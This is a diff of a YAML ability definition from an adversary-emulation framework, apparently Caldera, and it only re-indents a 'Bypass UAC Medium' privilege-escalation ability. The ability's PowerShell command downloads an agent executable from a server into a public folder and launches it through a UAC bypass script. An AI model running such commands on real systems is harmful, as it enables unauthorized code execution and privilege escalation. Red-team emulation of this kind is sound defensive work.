@@ -2,16 +2,16 @@
 
 - id: e3db134c-4aed-4c5a-9607-c50183c9ef9e
   name: Bypass UAC Medium
-    description: Bypass user account controls - medium
-    tactic: privilege-escalation
-    technique:
-      attack_id: T1088
-      name: Bypass User Account Control
-    platforms:
-      windows:
-        psh:
-          command: |
-            . .\Bypass-UAC.ps1
-            $url="#{server}/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);
-            Bypass-UAC -Command "C:\Users\Public\sandcat.exe -server #{server} -group my_group -v;"
-          payload: Bypass-UAC.ps1
+  description: Bypass user account controls - medium
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1088
+    name: Bypass User Account Control
+  platforms:
+    windows:
+      psh:
+        command: |
+          . .\Bypass-UAC.ps1
+          $url="#{server}/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);
+          Bypass-UAC -Command "C:\Users\Public\sandcat.exe -server #{server} -group my_group -v;"
+        payload: Bypass-UAC.ps1
